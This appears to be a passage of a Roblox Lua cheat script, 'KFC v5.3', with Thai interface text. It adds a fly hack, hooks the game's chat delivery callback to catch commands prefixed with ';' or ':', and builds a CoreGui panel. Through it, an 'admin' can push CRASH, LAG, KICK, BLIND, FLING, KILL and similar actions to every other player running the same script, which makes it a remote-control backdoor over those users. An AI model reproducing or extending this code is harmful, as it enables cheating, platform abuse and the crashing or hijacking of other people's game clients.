            flyBV=Instance.new("BodyVelocity"); flyBV.MaxForce=Vector3.new(1e9,1e9,1e9); flyBV.Velocity=Vector3.zero; flyBV.Parent=hrp
        end
        if not flyBG or flyBG.Parent~=hrp then
            if flyBG then flyBG:Destroy() end
            flyBG=Instance.new("BodyGyro"); flyBG.MaxTorque=Vector3.new(1e9,1e9,1e9); flyBG.CFrame=cam.CFrame; flyBG.Parent=hrp
        end
        hh.PlatformStand=true; flyBG.CFrame=cam.CFrame
        local d = Vector3.zero
        if not UserInputService:GetFocusedTextBox() then
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then d=d+cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then d=d-cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then d=d+cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then d=d-cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then d=d+Vector3.new(0,1,0) end
        end
        flyBV.Velocity = d.Magnitude>0 and d.Unit*U.FlySpeed or Vector3.zero
    end) end
end

-- ============ CHAT HANDLER (ใช้ ; หรือ :) ============
local function handleChat(raw)
    local args = {}; for w in raw:gmatch("%S+") do args[#args+1]=w end
    if #args==0 then return end
    local cmd = args[1]:lower(); local a2,a3,a4 = args[2],args[3],args[4]

    if cmd=="help" then
        notifyUI("คำสั่งที่ใช้ได้", "su-crash, su-cage, su-fling, su-speed <n>", false)
        return
    end
    
    if cmd=="scan" then
        local list = scanAllForScriptUsers()
        notifyUI("สแกนสำเร็จ", "พบผู้ใช้สคริปต์ "..#list.." คน", false)
        return
    end
    
    if cmd == "su-showmsg" then
        if not AdminState.IsAdmin then notifyUI("ผิดพลาด", "ต้องเป็นแอดมินเท่านั้น", true); return end
        local txt = raw:match("^%S+%s+(.+)$") or "Admin Message"
        local list = getScriptUserList()
        if #list == 0 then notifyUI("ไม่พบเป้าหมาย", "ไม่มีคนในเซิร์ฟที่รัน UI นี้", true); return end
        for _,n in ipairs(list) do
            if n ~= LocalPlayer.Name then broadcastSingle("SHOWMSG", n, txt) end
        end
        notifyUI("ส่งข้อความสำเร็จ", txt, false)
        return
    end
    
    if cmd=="su-speed" or cmd=="su-jump" or cmd=="su-gravity" then
        if not AdminState.IsAdmin then notifyUI("ผิดพลาด", "ต้องเป็นแอดมินเท่านั้น", true); return end
        local num = tonumber(a2)
        if not num then notifyUI("ผิดพลาด", "ใส่ตัวเลขด้วยครับ เช่น ;su-speed 100", true); return end
        local act = (cmd=="su-speed" and "SPEED") or (cmd=="su-jump" and "JUMP") or "GRAVITY"
        local list = getScriptUserList()
        if #list == 0 then notifyUI("ไม่พบเป้าหมาย", "ไม่มีคนในเซิร์ฟที่รัน UI นี้", true); return end
        for _,n in ipairs(list) do
            if n ~= LocalPlayer.Name then broadcastSingle(act, n, num) end
        end
        notifyUI("ส่งคำสั่งสำเร็จ", cmd.." เป็น "..num, false)
        return
    end
    
    local suCmds = {
        ["su-kill"]="KILL", ["su-void"]="VOID", ["su-fling"]="FLING",
        ["su-freeze"]="FREEZE_START", ["su-unfreeze"]="FREEZE_STOP",
        ["su-kick"]="KICK", ["su-unload"]="UNLOAD", ["su-sky"]="SKY",
        ["su-crash"]="CRASH", ["su-lag"]="LAG", ["su-blind"]="BLIND",
        ["su-mute"]="MUTE", ["su-unmute"]="UNMUTE", ["su-strip"]="STRIP",
        ["su-hideui"]="HIDEUI", ["su-showui"]="SHOWUI",
        ["su-cage"]="CAGE", ["su-explode"]="EXPLODE", ["su-dance"]="DANCE",
        ["su-sit"]="SIT", ["su-stand"]="STAND", ["su-spin"]="SPIN",
        ["su-bighead"]="BIGHEAD", ["su-smallhead"]="SMALLHEAD",
        ["su-heal"]="HEAL", ["su-ragdoll"]="RAGDOLL", ["su-reset"]="RESET",
        ["su-flip"]="FLIP", ["su-vibrate"]="VIBRATE",
    }
    if suCmds[cmd] then
        if not AdminState.IsAdmin then notifyUI("ผิดพลาด", "ต้องเป็นแอดมินเท่านั้น", true); return end
        local list = getScriptUserList()
        if #list == 0 then notifyUI("ไม่พบเป้าหมาย", "ไม่มีคนในเซิร์ฟที่รัน UI นี้อยู่", true); return end
        
        for _,n in ipairs(list) do
            if n ~= LocalPlayer.Name then broadcastSingle(suCmds[cmd], n) end
        end
        notifyUI("ส่งคำสั่งสำเร็จ", cmd.." ไปยัง "..#list.." คน", false)
        return
    end
    
    notifyUI("ไม่รู้จักคำสั่ง", "พิมพ์ ;help เพื่อดูคำสั่ง", true)
end

-- ดักจับแชท (ทั้ง ; และ :)
pcall(function()
    if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
        local origSD = TCS.ShouldDeliverCallback
        TCS.ShouldDeliverCallback = function(msg, src)
            local txt = msg.Text or ""
            local f = txt:sub(1,1)
            if f == ";" or f == ":" then
                task.spawn(function() handleChat(txt:sub(2)) end)
                return false
            end
            if origSD then return origSD(msg, src) end
            return true
        end
    end
end)
LocalPlayer.Chatted:Connect(function(m)
    local f = m:sub(1,1)
    if f == ";" or f == ":" then
        if TCS.ChatVersion ~= Enum.ChatVersion.TextChatService then
            handleChat(m:sub(2))
        end
    end
end)

-- ================================================================
-- UI CREATION
-- ================================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name="KFC_AntiSteal_UI"; ScreenGui.ResetOnSpawn=false
ScreenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; ScreenGui.Parent=CoreGui
ScreenGui.IgnoreGuiInset = true

local uiScale = Instance.new("UIScale")
uiScale.Parent = ScreenGui
local function updateUIScale()
    local vp = workspace.CurrentCamera.ViewportSize
    local target = math.min(vp.X / 400, vp.Y / 600)
    uiScale.Scale = math.clamp(target, 0.65, 1.1)
end
updateUIScale()
workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateUIScale)

local Main = Instance.new("Frame")
Main.Size=UDim2.new(0,320,0,500)
Main.Position=UDim2.new(0.5,0,0.5,0)
Main.AnchorPoint=Vector2.new(0.5,0.5)
Main.BackgroundColor3=Color3.fromRGB(20,20,26); Main.BorderSizePixel=0
Main.ClipsDescendants=true; Main.Visible=false; Main.Parent=ScreenGui
Instance.new("UICorner",Main).CornerRadius=UDim.new(0,16)
local MS = Instance.new("UIStroke",Main); MS.Color=Color3.fromRGB(60,60,75); MS.Thickness=1

local TB = Instance.new("Frame",Main)
TB.Size=UDim2.new(1,0,0,40); TB.BackgroundColor3=Color3.fromRGB(30,30,38); TB.BorderSizePixel=0
Instance.new("UICorner",TB).CornerRadius=UDim.new(0,16)

local TL = Instance.new("TextLabel",TB)
TL.Size=UDim2.new(1,-120,1,0); TL.Position=UDim2.new(0,14,0,0); TL.BackgroundTransparency=1
TL.Text="KFC v5.3"; TL.TextColor3=Color3.fromRGB(255,255,255); TL.TextSize=13
TL.Font=Enum.Font.GothamBold; TL.TextXAlignment=Enum.TextXAlignment.Left

local OB = Instance.new("TextLabel",TB)
OB.Size=UDim2.new(0,64,0,18); OB.Position=UDim2.new(1,-116,0,11)
OB.BackgroundColor3=AdminState.IsAdmin and Color3.fromRGB(0,150,0) or Color3.fromRGB(70,70,80)
OB.Text=AdminState.Role; OB.TextColor3=Color3.fromRGB(255,255,255); OB.TextSize=9; OB.Font=Enum.Font.GothamBold
Instance.new("UICorner",OB).CornerRadius=UDim.new(0,4)

local MinB = Instance.new("TextButton",TB)
MinB.Size=UDim2.new(0,22,0,22); MinB.Position=UDim2.new(1,-52,0,9)
MinB.BackgroundColor3=Color3.fromRGB(60,60,72); MinB.Text="−"
MinB.TextColor3=Color3.fromRGB(255,255,255); MinB.TextSize=16; MinB.Font=Enum.Font.GothamBold
Instance.new("UICorner",MinB).CornerRadius=UDim.new(0,6)

local ClB = Instance.new("TextButton",TB)
ClB.Size=UDim2.new(0,22,0,22); ClB.Position=UDim2.new(1,-26,0,9)
ClB.BackgroundColor3=Color3.fromRGB(70,40,45); ClB.Text="X"
ClB.TextColor3=Color3.fromRGB(255,255,255); ClB.TextSize=12; ClB.Font=Enum.Font.GothamBold
Instance.new("UICorner",ClB).CornerRadius=UDim.new(0,6)

local isMin=false; local FH,MH = 500,40
MinB.MouseButton1Click:Connect(function()
    isMin=not isMin
    TweenService:Create(Main,TweenInfo.new(0.22,Enum.EasingStyle.Quart),{Size=UDim2.new(0,320,0,isMin and MH or FH)}):Play()
    SF.Visible=not isMin; CmdBar.Visible=not isMin; MinB.Text=isMin and "+" or "−"
end)
ClB.MouseButton1Click:Connect(function() Main.Visible=false; Tgl.Visible=true end)

-- Command Bar
local CmdBar = Instance.new("Frame", Main)
CmdBar.Size = UDim2.new(1, -14, 0, 32)
CmdBar.Position = UDim2.new(0, 7, 0, 44)
CmdBar.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
CmdBar.BorderSizePixel = 0
Instance.new("UICorner", CmdBar).CornerRadius = UDim.new(0, 8)
local CmdStroke = Instance.new("UIStroke", CmdBar); CmdStroke.Color = Color3.fromRGB(70,70,85); CmdStroke.Thickness = 1

local CmdInput = Instance.new("TextBox", CmdBar)
CmdInput.Size = UDim2.new(1, -20, 1, 0); CmdInput.Position = UDim2.new(0, 10, 0, 0)
CmdInput.BackgroundTransparency = 1
CmdInput.PlaceholderText = "พิมพ์คำสั่ง... (เช่น ;su-crash)"
CmdInput.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
CmdInput.Text = ""; CmdInput.TextColor3 = Color3.fromRGB(255, 255, 255)
CmdInput.TextSize = 11; CmdInput.Font = Enum.Font.Gotham
CmdInput.ClearTextOnFocus = false; CmdInput.TextXAlignment = Enum.TextXAlignment.Left
CmdInput.FocusLost:Connect(function(enterPressed)
    if enterPressed and CmdInput.Text ~= "" then
        local txt = CmdInput.Text
        if txt:sub(1,1) == ";" or txt:sub(1,1) == ":" then txt = txt:sub(2) end
        handleChat(txt)
        CmdInput.Text = ""
    end
end)

local SF = Instance.new("ScrollingFrame",Main)
SF.Size=UDim2.new(1,-14,1,-86); SF.Position=UDim2.new(0,7,0,84)
SF.BackgroundTransparency=1; SF.BorderSizePixel=0
SF.ScrollBarThickness=2; SF.ScrollBarImageColor3=Color3.fromRGB(90,90,110)
SF.CanvasSize=UDim2.new(0,0,0,0)
SF.AutomaticCanvasSize=Enum.AutomaticSize.Y
SF.ScrollingDirection=Enum.ScrollingDirection.Y

local SL = Instance.new("UIListLayout",SF); SL.SortOrder=Enum.SortOrder.LayoutOrder; SL.Padding=UDim.new(0,6)

local function section(txt)
    local f = Instance.new("Frame",SF); f.Size=UDim2.new(1,0,0,22); f.BackgroundTransparency=1
    f.LayoutOrder=#SF:GetChildren()
    local l = Instance.new("TextLabel",f); l.Size=UDim2.new(1,0,1,0); l.BackgroundTransparency=1
    l.Text=txt; l.TextColor3=Color3.fromRGB(170,170,195); l.TextSize=11; l.Font=Enum.Font.GothamBold; l.TextXAlignment=Enum.TextXAlignment.Left
end
local function btn(txt, cb)
    local b = Instance.new("TextButton",SF); b.Size=UDim2.new(1,0,0,32)
    b.BackgroundColor3=Color3.fromRGB(38,38,48); b.Text=txt; b.TextColor3=Color3.fromRGB(255,255,255)
    b.TextSize=12; b.Font=Enum.Font.Gotham; b.AutoButtonColor=false; b.LayoutOrder=#SF:GetChildren()
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,8)
    local s = Instance.new("UIStroke",b); s.Color=Color3.fromRGB(70,70,85); s.Thickness=1
    b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(52,52,66)}):Play() end)
    b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(38,38,48)}):Play() end)
    b.MouseButton1Click:Connect(cb); return b
end

-- ============ UI SECTIONS ============
section("👥 SCRIPT USERS")
local suLabel = Instance.new("TextLabel",SF)
suLabel.Size = UDim2.new(1,0,0,0); suLabel.AutomaticSize = Enum.AutomaticSize.Y
suLabel.BackgroundColor3=Color3.fromRGB(28,28,36); suLabel.BackgroundTransparency = 0.3
suLabel.TextColor3=Color3.fromRGB(210,210,230); suLabel.TextSize=11
suLabel.Font=Enum.Font.Gotham; suLabel.TextWrapped=true
suLabel.TextXAlignment=Enum.TextXAlignment.Left; suLabel.TextYAlignment=Enum.TextYAlignment.Top
suLabel.LayoutOrder=#SF:GetChildren(); suLabel.Parent=SF
local suPad = Instance.new("UIPadding",suLabel)
suPad.PaddingLeft=UDim.new(0,8); suPad.PaddingRight=UDim.new(0,8)
suPad.PaddingTop=UDim.new(0,6); suPad.PaddingBottom=UDim.new(0,6)
Instance.new("UICorner",suLabel).CornerRadius=UDim.new(0,8)
local suStroke = Instance.new("UIStroke",suLabel); suStroke.Color=Color3.fromRGB(60,60,75); suStroke.Thickness=1

local function refreshSU()
    local list = getScriptUserList()
    if #list == 0 then
        suLabel.Text = "⚠️ ยังไม่พบผู้ใช้สคริปต์\n(กด Scan หรือรอให้มีคนเปิดเพลง)"
    else
        local t = {}
        for _,n in ipairs(list) do
            local m = math.floor((os.time()-(ScriptUsers[n] or os.time()))/60)
            t[#t+1] = "• "..n.."  ("..m.."m)"
        end
        suLabel.Text = "พบ "..#list.." คน:\n"..table.concat(t,"\n")
    end
end
refreshSU()

btn("🔄 Scan & Refresh", function() scanAllForScriptUsers(); refreshSU() end)

if AdminState.IsAdmin then
    section("⚔️ SU COMMANDS (ปุ่มกด)")
    local function runSU(action, param)
        local l = getScriptUserList()
        if #l == 0 then notifyUI("ไม่พบเป้าหมาย", "ไม่มีคนในเซิร์ฟที่รัน UI นี้", true); return end
        for _,n in ipairs(l) do
            if n~=LocalPlayer.Name then broadcastSingle(action, n, param) end
        end
        notifyUI("ส่งคำสั่งสำเร็จ", action.." ไปยัง "..#l.." คน", false)
    end
    btn("💥 Crash All", function() runSU("CRASH") end)
    btn("🌀 Fling All", function() runSU("FLING") end)
    btn("🕶️ Blind All", function() runSU("BLIND") end)
    btn("🔒 Cage All", function() runSU("CAGE") end)
    btn("👁️ Hide UI All", function() runSU("HIDEUI") end)
end

-- Floating Toggle
local Tgl = Instance.new("TextButton",ScreenGui)
Tgl.Size=UDim2.new(0,54,0,54); Tgl.Position=UDim2.new(1,-50,0.5,0); Tgl.AnchorPoint=Vector2.new(0.5,0.5)
Tgl.BackgroundColor3=Color3.fromRGB(30,30,38); Tgl.Text="🎵"; Tgl.TextSize=22
Tgl.TextColor3=Color3.fromRGB(255,255,255); Tgl.AutoButtonColor=false
Instance.new("UICorner",Tgl).CornerRadius=UDim.new(1,0)
local Ts = Instance.new("UIStroke",Tgl); Ts.Color=Color3.fromRGB(70,70,90); Ts.Thickness=2
Tgl.MouseButton1Click:Connect(function() Main.Visible=not Main.Visible; Tgl.Visible=not Main.Visible end)

-- Drag
local dg,ds,sp = false,nil,nil
TB.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dg=true; ds=i.Position; sp=Main.Position end
end)
UserInputService.InputChanged:Connect(function(i)
    if dg and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
        local d = i.Position - ds; Main.Position = UDim2.new(sp.X.Scale, sp.X.Offset+d.X, sp.Y.Scale, sp.Y.Offset+d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dg=false end
end)

print("[KFC v5.3] โหลดสำเร็จ! ใช้คำสั่งนำหน้าด้วย ; หรือ : เช่น ;su-crash")